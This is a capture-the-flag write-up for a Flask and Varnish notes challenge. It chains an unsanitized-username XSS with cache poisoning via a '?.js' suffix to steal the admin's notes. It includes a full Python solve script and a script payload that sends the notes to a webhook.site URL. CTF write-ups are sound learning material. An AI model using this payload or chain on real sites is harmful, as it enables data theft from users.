#self xss to stored xss via cache poisoning

- flag is in admin's flag note. The flag was inserted into the notes database table with a random large ID and belonged to user_id 1, the admin user.
- written in flask, uses varnish http cache for caching requests.
- IDOR vulnerability in deleting other users' notes via DELETE route `/api/note/<int:note_id>`.
```py
@app.route('/api/note/<int:note_id>', methods=['DELETE'])
@authenticated_only
def api_delete_note(note_id):
    success = db.delete_note_by_id(note_id, session.get('user_id'))
    if success:
        return jsonify({'message': 'Note deleted successfully'})
    else:
        return jsonify({'error': 'Note deletion failed'}), 400
 ```

```py
class Database:
    [...]
    def delete_note_by_id(self, note_id, user_id):
        with closing(self.connect_db()) as db:
            with db as conn:
                cursor = conn.execute('''
                    DELETE FROM notes WHERE id = ?
                ''', (note_id,))
                return cursor.rowcount > 0
```
variable user_id in method delete_note_by_id is not even used, and it doesn't check the note is really belong to the correct user.

- /api/report route which helps us to send the url to admin bot to call the method visit.

- stored xss via unsanitized username input:
    - The view_note_long.html template renders the user's username using the | safe filter. This filter prevents Jinja from HTML entity encoding the username.
    - The API registration endpoint (/api/register) does not sanitize the username before inserting it into the users table.
    - This flaw allows an attacker to register a user with an XSS payload (e.g., `<script>...</script>`) in the username. When the attacker views the "long version" of their own note, this is triggered (a Self-XSS)

- cache poisoning:
    - The Varnish configuration uses a regular expression `(\.(js|css|png|gif)$)` to determine which URLs to cache.
    - This regex is flawed because it only requires the URL to end with one of those extensions.
    - An attacker can append a query parameter like ?.js to a non-static URL (e.g., /note/123/long) to force Varnish to cache the full HTML output of that page.

Steps:
1. register a new user with a  xss payload like `<script>fetch('/api/notes').then(response => response.json()).then(jsonResponse => fetch('//webhook.site/...[attacker URL]?notes=' + JSON.stringify(jsonResponse)))</script>`
(to read all notes accessible to the admin bot (including the flag note) via the internal endpoint /api/notes, and then exfiltrate the resulting JSON data to an attacker-controlled webhook server)
2. create a note in that users account.
3. Repeatedly request the "long view" of the attacker's note, appending a cache-triggering query string (e.g., /note/ID/long?.js), until the Varnish response header X-Cache-Hits confirms the page is cached.
4. report the poisoned url to the admin bot
5.  The bot visits the cached URL, executes the stored XSS payload, and sends the admin's notes (which contain the flag) to the attacker's server.


solve script:
```py
#!/usr/bin/env python3
import requests
import random
from string import ascii_letters

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.session()
        self.isLocal = False
        self.RANDOM_PASSWORD = Solver.generateRandomString(10)
        self.REGISTER_ENDPOINT = '/api/register'
        self.LOGIN_ENDPOINT = '/api/login'
        self.CREATE_NEW_NOTE_ENDPOINT = '/api/note/new'
        self.GET_ALL_NOTES_ENDPOINT = '/api/notes'
        self.VIEW_NOTE_ENDPOINT = '/note'
        self.LONG_NOTE_TYPE = 'long'
        self.CACHE_EXTENSIONS = {
            'js': '.js',
            'css': '.css',
            'png': '.png',
            'gif': '.gif'
        }
        self.TARGET_CACHE_AGE = 5
        self.REPORT_ENDPOINT = '/api/report'

    def generateRandomString(length):
        return ''.join(random.choice(ascii_letters) for i in range(length))

    def register(self, xssPayload):
        data = {
            'username': xssPayload,
            'password': self.RANDOM_PASSWORD
        }
        print(f'[*] Registering new user with username "{data["username"]}" | Password: "{data["password"]}"')

        response = self.session.post(f'{self.baseUrl}{self.REGISTER_ENDPOINT}', json=data)
        if response.status_code != 200:
            print('[-] Unable to register a new user')
            exit(0)
        print('[+] Registered a new user')

    def login(self, xssPayload):
        data = {
            'username': xssPayload,
            'password': self.RANDOM_PASSWORD
        }
        print(f'[*] Loggin user "{data["username"]}"')

        response = self.session.post(f'{self.baseUrl}{self.LOGIN_ENDPOINT}', json=data)
        if response.status_code != 200:
            print('[-] Unable to login to that user')
            exit(0)
        print('[+] Registered a new user')

    def createNewNote(self, title='foo', content='bar'):
        data = {
            'title': title,
            'content': content
        }
        print('[*] Creating a new note')

        response = self.session.post(f'{self.baseUrl}{self.CREATE_NEW_NOTE_ENDPOINT}', json=data)
        if response.status_code != 200:
            print('[-] Unable to create a new note')
            exit(0)

        print('[+] Created a new note')

    def getRandomNoteId(self):
        print('[*] Getting a random note ID')
        response = self.session.get(f'{self.baseUrl}{self.GET_ALL_NOTES_ENDPOINT}')
        if response.status_code != 200:
            print('[-] Unable to get a random note ID')
            exit(0)

        # just get the first note, we don't care about which note that we are 
        # gonna do cache poisoning
        randomNoteId = str(response.json()['notes'][0]['id'])
        print(f'[+] Random note ID: {randomNoteId}')
        return randomNoteId

    def cachePoisoning(self, noteId, cacheExtension='js'):
        print(f'[*] Poisoning note ID {noteId}')
        cacheHitNumber = 0
        url = str()
        for _ in range(11):
            url = f'{self.baseUrl}{self.VIEW_NOTE_ENDPOINT}/{noteId}/{self.LONG_NOTE_TYPE}?{self.CACHE_EXTENSIONS[cacheExtension]}'
            response = self.session.get(url)
            
            cacheHitNumber = int(response.headers['X-Cache-Hits'])
            print(f'[*] Current cache hits: {cacheHitNumber}', end='\r')

            if cacheHitNumber == self.TARGET_CACHE_AGE:
                break

        if cacheHitNumber == 0:
            print(f'\n[-] Unable to poison note ID {noteId}')
            exit(0)

        print(f'\n[+] Note ID {noteId} is now poisoned with age {cacheHitNumber}! URL: {url}')
        return url

    def reportToAdminBot(self, poisonedUrl):
        data = {
            'url': poisonedUrl
        }
        print(f'[*] Reporting to the admin bot with URL: {data["url"]}')
        response = requests.post(f'{self.baseUrl}{self.REPORT_ENDPOINT}', json=data)
        if response.status_code != 200:
            print('[-] Unable to report the URL to the admin bot')
            exit(0)

        print('[+] Reported to the admin bot. Check your exfiltrated attacker server to see if there\'s any new request.')

    def solve(self, xssPayload, isPayloadAppendRandomUsername=True):
        if 'localhost' in self.baseUrl:
            self.isLocal = True

        # avoid keep registering with the exact same username
        if isPayloadAppendRandomUsername:
            xssPayload += Solver.generateRandomString(10)

        self.register(xssPayload)
        self.login(xssPayload)
        self.createNewNote()
        randomNoteId = self.getRandomNoteId()

        poisonedUrl = self.cachePoisoning(randomNoteId)
        self.reportToAdminBot(poisonedUrl)

if __name__ == '__main__':
    # baseUrl = 'http://localhost' # for local testing
    baseUrl = 'https://42582f7d651545634d8c119d86d4ad62-49590.inst1.chal-kalmarc.tf'
    solver = Solver(baseUrl)
    
    xssPayload = '<script>fetch(`/api/notes`).then(response => response.json()).then(jsonResponse => fetch(`//webhook.site/638a21c2-2009-4d8e-99f6-ca9e3c3e8a69?notes=${JSON.stringify(jsonResponse)}`))</script>'
    solver.solve(xssPayload)
```
